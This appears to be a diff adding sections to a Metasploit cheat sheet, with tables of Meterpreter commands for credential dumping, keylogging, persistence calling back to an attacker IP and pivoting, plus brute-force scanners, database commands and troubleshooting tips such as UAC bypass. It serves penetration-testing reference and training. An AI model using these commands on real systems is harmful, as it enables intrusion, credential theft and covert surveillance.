@@ -53,3 +53,78 @@ set LPORT [YOUR_PORT]
 set ExitOnSession false
 run -j
 ```
+
+## 📂 Meterpreter Commands
+|Category	|Command|
+|----|----|
+|System	|`sysinfo`, `getuid`, `ps`, `migrate [PID]`|
+|File	|`ls`, `cd`, `pwd`, `upload [local] [remote]`, `download [remote] [local]`, `search -f [filename]`|
+|Network|	`ipconfig`, `netstat`, `arp` ,`route`|
+|Privilege	|`getsystem`, `hashdump`, l`oad kiwi`, `creds_all`|
+|Stealth|`screenshot`, `keyscan_start`, `keyscan_dump`, `keyscan_stop`|
+|Persistence	|`run persistence -A -X -i 10 -p [PORT] -r [IP]`|
+|Pivoting|	`portfwd add -l [local_port] -p [remote_port] -r [remote_ip]`|
+
+
+## 🧠 Auxiliary Scanners
+|Task|	Command|
+|----|----|
+|TCP port scan	|`use auxiliary/scanner/portscan/tcp`|
+|SMB version detection|	`use auxiliary/scanner/smb/smb_version`|
+|EternalBlue check	|`use auxiliary/scanner/smb/smb_ms17_010`|
+|HTTP directory scanner	|`use auxiliary/scanner/http/dir_scanner`|
+|SSH brute force|	`use auxiliary/scanner/ssh/ssh_login`|
+|MySQL login brute|	`use auxiliary/scanner/mysql/mysql_login`|
+
+
+## 🛠️ Database Commands
+|Task	|Command|
+|----|----|
+|Check database status	|`db_status`|
+|Create workspace|	`workspace -a [name]`|
+|Switch workspace	|`workspace [name]`|
+|Import Nmap scan|	`db_import [file.xml]`|
+|List hosts	|`hosts`|
+|List services|	`services`|
+|Set RHOSTS from hosts|	`hosts -R`|
+|List credentials|	`creds`|
+|Generate HTML report	|`report -f html -o [file.html]`|
+
+
+## ⚡ Resource Scripts
+|Task	|Command|
+|----|----|
+|Run a resource script|	`msfconsole -r script.rc`|
+|Run from inside msfconsole	| `resource script.rc`|
+|Auto-run on startup	|Save to `~/.msf4/msfconsole.rc`|
+
+
+
+## 🆘 Troubleshooting
+|Problem	|Likely Fix|
+|----|----|
+|No session after payload	|Check LHOST, LPORT, firewall|
+|Database not connected	|`sudo systemctl start postgresql`|
+|Session not Meterpreter	|`sessions -u [ID]`|
+|getsystem fails|	Try UAC bypass first|
+|hashdump fails	|`load kiwi; creds_all`|
+|Connection drops|	Use `reverse_https` payload|
+
+
+
+[📖 Back to full manual](README.md).
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
